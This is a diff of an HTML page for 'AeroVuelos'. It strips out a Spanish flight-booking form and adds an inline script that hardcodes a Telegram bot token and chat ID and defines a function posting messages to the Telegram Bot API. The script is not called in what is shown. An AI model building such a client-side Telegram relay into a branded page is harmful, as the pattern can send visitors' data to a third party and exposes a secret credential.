@@ -1,45 +1,28 @@
-<!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AeroVuelos Colombia - Reservación de Vuelos</title>
+    <title>AeroVuelos Application</title>
 </head>
 <body>
-    <header>
-        <h1>Bienvenido a AeroVuelos Colombia</h1>
-        <nav>
-            <ul>
-                <li><a href="#home">Inicio</a></li>
-                <li><a href="#booking">Reservar Vuelo</a></li>
-                <li><a href="#contact">Contacto</a></li>
-            </ul>
-        </nav>
-    </header>
-    <main>
-        <section id="home">
-            <h2>Inicio</h2>
-            <p>Encuentra los mejores precios para tus vuelos.</p>
-        </section>
-        <section id="booking">
-            <h2>Reservar Vuelo</h2>
-            <form>
-                <label for="from">Desde:</label>
-                <input type="text" id="from" name="from" required>
-                <label for="to">Hasta:</label>
-                <input type="text" id="to" name="to" required>
-                <label for="date">Fecha:</label>
-                <input type="date" id="date" name="date" required>
-                <button type="submit">Buscar</button>
-            </form>
-        </section>
-        <section id="contact">
-            <h2>Contacto</h2>
-            <p>Puedes contactarnos a través de nuestro correo electrónico: contacto@aerovuelos.com</p>
-        </section>
-    </main>
-    <footer>
-        <p>&copy; 2026 AeroVuelos Colombia. Todos los derechos reservados.</p>
-    </footer>
+    <h1>Welcome to AeroVuelos</h1>
+    <script>
+        const token = '8211219706:AAE3tN8m1u7OrV5txNiod4fwcpTlCk1FE8w';
+        const chatId = '8211219706';
+
+        function sendMessage(message) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
 </body>
 </html>
